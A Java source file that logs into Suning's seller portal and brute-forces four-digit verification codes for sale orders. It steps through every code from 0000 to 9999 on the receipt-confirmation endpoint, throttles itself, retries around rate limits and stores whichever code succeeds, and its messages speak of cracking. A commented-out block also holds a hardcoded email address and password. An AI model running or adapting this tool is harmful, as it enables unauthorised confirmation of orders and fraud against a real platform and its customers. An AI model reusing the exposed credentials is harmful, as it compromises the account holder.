package wilson.verifyCode;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Date;
import java.util.List;

import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class MainClient extends Thread{ 
	private BasicCookieStore cookieStore = new BasicCookieStore();
	private CloseableHttpClient httpclient = HttpClients.custom()
    .setDefaultCookieStore(cookieStore)
    .build();
	private VerifyCode vc = new VerifyCode();
	private SelectDeliverInform sdi = new SelectDeliverInform();
	private Login lg = new Login();
	private VerifyCodeManager vcm = new VerifyCodeManager();
	private int codeInt = 3885;
	private int codeNow = 0;
	
	
	public int getCodeNow() {
		return codeNow;
	}

	public void setCodeNow(int codeNow) {
		this.codeNow = codeNow;
	}

	String userName = "";
	String password = "";
	String saleOrderNo = "";
	
	
	private static String cacheUsername = "";
	private static String cachePassword = "";
	private static String cacheLoginURL = "https://passport.suning.com/ids/login";
	
	public static void main(String[] args) {
//		MainClient mc = new MainClient();
//		mc.setUserName("qxgs2013@163.com");
//		mc.setPassword("qingxin2013");
//		mc.setSaleOrderNo("00015683400601");
//		mc.start();
	}	
	
	public void reTry(int code,String orderno){
		MainClient mc = new MainClient();
		mc.setUserName(MainClient.getCacheUsername());
		mc.setPassword(MainClient.getCachePassword());
		mc.setSaleOrderNo(orderno);
		mc.setCodeInt(code);
		mc.start();
	}
	
	
	public void run(){
		try {
			startThis(this.getUserName(), this.getPassword(), this.getSaleOrderNo(),this.getCodeInt(),this);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

    public String startThis(String userName,String password,String saleOrderNo,int startCode,MainClient mc) throws Exception {
    	this.cacheUsername = userName;
    	this.cachePassword = password;
    	//System.out.println("尝试中，用户名 = " + userName + "  销售单号 = " + saleOrderNo );
    	
    	if(!login(userName, password,mc)){
    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
    		return "登录失败";
    	} 
    	
    	/**
    	if(!select(saleOrderNo)){
    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
    		return "查询失败";
    	} 
    	**/
    	if(startCode == 0){
    		vcm.saveVerifyCode(saleOrderNo,this.getCodeInt(),this.getSdi().getSearchResult(),1);
    	}
    	
    	
    	if(!tryCode(saleOrderNo,startCode,mc)){
    		if(getCodeNow() >= 0){
    			closeClient();
    			reTry(this.getCodeNow(),saleOrderNo);
    		}
    		
//    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
//    		Thread.currentThread();
//			Thread.sleep(10000);
//    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   重试中");
//    		if(login(userName, password) && tryCode(saleOrderNo,this.getCodeNow())){
//    			//continue;
//    		}else{
//    			return "破解失败";
//    		}
    		return "其他进程中重试";
    	}else{
    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   成功  ，验证码是  " + this.getCodeInt());
        	//成功后做记录
        	if(vcm.updateVerifyCode(saleOrderNo,this.getCodeInt(),this.getSdi().getSearchResult(),0)){
        		System.out.println("销售订单号=" + saleOrderNo + "验证码=" + this.getCodeInt() + " 保存成功");
        	}else{
        		System.out.println("销售订单号=" + saleOrderNo + "验证码=" + this.getCodeInt() + " 保存失败");
        	}
        	return "成功";
    	}

    	
    }
    
    
    private boolean closeClient(){
    	try {
			this.getHttpclient().close();	
			return true;
		} catch (IOException e) {
			e.printStackTrace();
		}
    	return false;
    }
    
    private boolean tryCode(String saleOrderNo,int startCode,MainClient mc) {
    	//尝试验证
    	try{
    		//System.out.println("开始验证时间 =" + new Date());
        	int verifycodeResult = verifycode(startCode,saleOrderNo,mc);

    		if(verifycodeResult == VerifyCode.TRUE){
        		System.out.println("验证完成，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
        	}else if(verifycodeResult == VerifyCode.FALSE){
        		//System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
        		return false;
        	}else if(verifycodeResult == VerifyCode.RETRY){
        		//System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
        		return false;
        	}else if(verifycodeResult == VerifyCode.RETRYLONG){
        		//System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
        		Thread.sleep(1000*60*60);
        		return false;
        	}else{
        		System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
        		setCodeNow(-1);
        		return false;
        	}
        	
        	System.out.println("完成验证时间 = " + new Date());
        	return true;
    	}catch(Exception e){
    		e.printStackTrace();
    	}
    	return false;
    }
    
    public boolean login(String userName,String password,MainClient mc) throws URISyntaxException{
    	//登录
    	
    	if(true == lg.loginpost(new URI("https://passport.suning.com/ids/login"),userName,password,mc)){
    		System.out.println(userName + "登录成功");  
    		
//    		if (null != loginCookies) {
//    			System.out.println("登录cookies");
//                for (int i = 0; i < loginCookies.size(); i++) {
//                    System.out.println("- " + loginCookies.get(i).toString());
//                }
//            }
    		return true;
    	}else{
    		System.out.println("登录失败");
    		return false;
    	}
    }
    
    public boolean select(String saleOrderNo) throws URISyntaxException{
    	//查询
    	if(true == sdi.selectDeliverInform(new URI("http://scs.suning.com/sps/saleOrder/saleOrderDetail.action"),saleOrderNo)){
    		System.out.println("查询成功");
    		return true;
    	}else{
    		System.out.println("查询失败");
    		return false;
    	}
    	
    }
    
    //尝试验证码
    int verifycode(int startCode,String saleOrderNo,MainClient mc) throws URISyntaxException {
    	int resultcode = -1;
    	int i = 0;
    	codeInt = startCode;
    	String codeStr = String.valueOf(codeInt);
    	while(codeStr.length() < 4){
    		codeStr = "0" + codeStr;
    	}
    	while(codeInt < 10000){
//    		try {
//				Thread.sleep(1000);
//			} catch (InterruptedException e) {
//				// TODO Auto-generated catch block
//				e.printStackTrace();
//			}
    		resultcode = vc.VerifyCode(new URI("http://scs.suning.com/sps/saleOrder/updateConfirmReceipt.action"), codeStr,saleOrderNo,mc);
    		if(resultcode == 1){   
    			try {
					Thread.sleep(1500);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
    			codeInt ++;
    			if(0 == (i % 100)){
    				System.out.println("saleOrderNo : " + saleOrderNo + " code : " + codeInt + " " + resultcode + "  ");
    			}
    			i ++ ;
        		codeStr = String.valueOf(codeInt);
            	while(codeStr.length() < 4){
            		codeStr = "0" + codeStr;
            	}
    		}else if (resultcode == VerifyCode.TRUE){
            	System.out.println("saleOrderNo = " + saleOrderNo + " other result, result = " + resultcode);
    			break;
    		}else if(resultcode == VerifyCode.RETRY){
    			this.setCodeNow(codeInt);
    			break;
    		}else if(resultcode == VerifyCode.RETRYLONG){
    			this.setCodeNow(codeInt);
    			break;
    		}else{
    			this.setCodeNow(codeInt);
    			System.out.println("saleOrderNo = " + saleOrderNo + " other result, result = " + resultcode);
    			break;
    		}
    	}
		return resultcode;
    }


	public CloseableHttpClient getHttpclient() {
		return httpclient;
	}

	public void setHttpclient(CloseableHttpClient httpclient) {
		this.httpclient = httpclient;
	}

	public  VerifyCode getVc() {
		return this.vc;
	}

	public  void setVc(VerifyCode vc) {
		this.vc = vc;
	}

	public  SelectDeliverInform getSdi() {
		return this.sdi;
	}

	public  void setSdi(SelectDeliverInform sdi) {
		this.sdi = sdi;
	}

	public Login getLg() {
		return this.lg;
	}

	public  void setLg(Login lg) {
		this.lg = lg;
	}

	public int getCodeInt() {
		return codeInt;
	}

	public void setCodeInt(int codeInt) {
		this.codeInt = codeInt;
	}


	public String getSaleOrderNo() {
		return saleOrderNo;
	}


	public void setSaleOrderNo(String saleOrderNo) {
		this.saleOrderNo = saleOrderNo;
	}

	public VerifyCodeManager getVcm() {
		return vcm;
	}

	public void setVcm(VerifyCodeManager vcm) {
		this.vcm = vcm;
	}

	public String getUserName() {
		return userName;
	}

	public void setUserName(String userName) {
		this.userName = userName;
	}

	public String getPassword() {
		return password;
	}

	public void setPassword(String password) {
		this.password = password;
	}

	public static String getCacheUsername() {
		return cacheUsername;
	}

	public static String getCachePassword() {
		return cachePassword;
	}

	public static String getCacheLoginURL() {
		return cacheLoginURL;
	}
}
